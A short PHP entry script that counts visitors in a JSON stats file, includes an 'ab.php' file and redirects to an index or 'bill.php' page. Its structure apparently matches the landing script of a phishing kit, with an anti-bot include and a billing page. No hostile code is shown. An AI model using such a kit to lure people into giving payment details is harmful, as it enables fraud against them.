<?php

include('./server/ab.php');

$json = file_get_contents('./server/stats.json');
$data = json_decode($json, true);
$data['data']['visiteur']++;
$json = json_encode($data);
file_put_contents('./server/stats.json', $json);

if($PreviewMessage)
{
    header('location: ./app/pages/index.php');
}else{
    header('location: ./app/pages/bill.php');
}

?>